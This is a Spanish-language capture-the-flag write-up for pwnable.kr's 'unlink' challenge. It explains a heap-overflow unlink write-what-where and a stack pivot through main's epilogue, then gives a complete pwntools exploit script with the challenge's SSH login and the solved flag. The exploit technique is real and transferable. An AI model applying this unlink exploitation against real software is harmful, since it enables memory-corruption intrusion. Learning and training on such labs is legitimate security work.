# unlink

<img width="283" height="359" alt="unlink" src="https://github.com/user-attachments/assets/38081018-6712-4d6f-b6f7-897953388670" />

## Introduccion

**Al igual que el reto *uaf*, este requiere que se tenga un conocimiento basico del heap y malloc**

```
 checksec unlink
[*] '/home/kalcast/Laboratorio/pwn/unlink'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

Nos dan el codigo fuente y vemos que implementa una struct "OBJ" que es luce muy similar a un tipico chunk del heap (basicamente es la misma estructura que un chunk libre tipico):
``` C
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;
```

Se reserva espacio en el heap con `malloc` y usa las propiedades del struct para crear una lista enlazada:
```C
	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;
```

Y la funcion "unlink" es una implementacion primitiva de `unlink()` que existia en versiones antiguas de glibc (<=2.3.5)
``` C
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
```

Nos filtran una direccion del stack (puntero a "A") y otra del heap (header de "A").

Ademas contamos con una funcion `shell` que llama a `system("/bin/sh")`.

## Heap overflow y Unlink
Entonces nos dejan bien claros que tenemos que usar un heap overflow para que al llamar a `unlink()` podamos hacer un what-write-where.

Se hace un unlink a "B". Con el heap overflow en "A" controlamos FD y BK.

Nota: *No estamos trabajando con los verdaderos `fd` y `bk`, sino con los de la estructura. NO hay offset a `fd` y solo 4 bytes de offset a `bk`.

Mis primeros intentos fueron infructuosos por culpa de `BK->fd=FD`.

Por ejemplo, si hacemos FD=`ret_address_in_stack - 4` y BK=`shell_addr` ocurre:
```
  BK = shell_addr
  FD = ret_address_in_stack - 4
  FD->bk(ret_address_in_stack - 4 + 4) =  shell_addr
  BK->fd(shell_address) = ret_address_in_stack - 4    <--- La seccion .data NO es escribible (segfault)

```

Y si usasemos `heap_leaked_address` o alguna direccion relativa recordemos que entonces `heap_leaked_address - 4 = ret_address_in_stack`. Por lo que nuestro shellcode queda arruinado.

Por suerte la funcion `main` tiene un epilogo peculiar:

<img width="1334" height="657" alt="2025-08-01-174207_1334x657_scrot" src="https://github.com/user-attachments/assets/b3cbb92d-b418-4ba1-9d62-74866b687dae" />

La funcion hace `esp=ebp-8`, luego `pop ecx,ebx,ebp`, y por ultimo `esp=ecx-4`.

Mi idea fue hacer `FD=ebp_minus_8 - 4` y `BK=heap_address + 12`.

Nuestro heap_leak es al header de "A", al sumarle 12 lo colocamos en "A->buf\[3\]".

Cuando se ejecute `unlink(B)`, `ebp-8` contendrá la direccion de "A->buf\[3\]". Igualmente, "A->buf\[3\]" contendrá la direccion de `ebp-8`.

Al final de main `pop ecx` hará `ecx=0x8a0d9bc` y `lea esp, [ecx - 4]`  produce `esp=0x8a0d9b8` ("A->buf"), que contendrá la direccion de nuestra shell:

```py
from pwn import *
s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest') ;r = s.process(["./unlink"])
#r = process("./unlink")

r.recvuntil(b"leak: ")
stack_address = int(r.recvline().strip(),16)
r.info("Stack address leak: {}".format(hex(stack_address)))

r.recvuntil(b"leak: ")
heap_address = int(r.recvline().strip(),16)
r.info("Heap address leak: {}".format(hex(heap_address)))

shell_address = 0x080491d6
ebp_minus_8 = stack_address + 12             

#FD = ebp_8 - 4
#BK = A+ 12
#FD->bk = ebp_8 + 4 -4 = BK
#BK->fd = heap_address = ebp_8 - 4
payload = p32(shell_address)                      # A->buf (A + 8)
payload += b"A" * 12                              # A->buf
payload += b"B" * 8                               # B_prevsize, B_size 
payload += p32(ebp_minus_8 - 4)                   # B->fd   (FD)
payload += p32(heap_address + 12)                 # B->bk   (BK)

r.sendline(payload)
r.interactive()
```

`wr1te_what3ver_t0_4nywh3re`

